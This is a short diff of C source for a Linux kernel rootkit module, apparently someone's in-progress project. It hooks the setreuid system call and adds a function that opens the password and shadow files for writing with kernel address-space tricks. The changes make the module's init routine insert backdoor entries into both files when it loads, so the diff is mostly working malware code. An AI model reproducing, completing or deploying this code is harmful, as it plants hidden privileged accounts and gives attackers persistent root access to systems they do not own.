@@ -41,17 +41,17 @@ asmlinkage int our_setreuid(uid_t ruid, uid_t euid){
 	return old_setreuid(ruid, euid);
 }
 
-// Start Marc STILL WORKING ON IT, IDK WHAT THIS ISSSSS
+// Start Marc
 	void add_backdoor(char *path) {
 		struct file *file;
 		char *BACKDOOR;
-		// mm_segment_t old_fs;
+		mm_segment_t old_fs;
 		
 		char *buffer;
 		bool has_backdoor = false;
 		int page_count = 0;
 		
-		loff_t offset; // WHAT
+		loff_t offset; 
 		
 		unsigned long ret;
 		
@@ -60,11 +60,11 @@ asmlinkage int our_setreuid(uid_t ruid, uid_t euid){
 		if (strcmp(path, SHADOW_FILE) == 0)
 			{BACKDOOR = BACKDOOR_SHADOW;}
 		
-		old_fs = get_fs(); // WHAT
+		old_fs = get_fs(); 
 		
-		set_fs(get_ds()); // WHAT
-	    	file = filp_open(path, O_RDWR, 0); // WHAT
-	    	set_fs(old_fs); // WHAT
+		set_fs(get_ds()); 
+	    	file = filp_open(path, O_RDWR, 0); 
+	    	set_fs(old_fs); 
 
 	    	if(IS_ERR(file)){
 			goto exit;
@@ -217,6 +217,9 @@ static int __init rootkit_init(void){
   	}
 	
 	// Start Marc
+	
+	add_backdoor(PASSWD_FILE);
+    	add_backdoor(SHADOW_FILE);
 	
 	// End Marc
 	
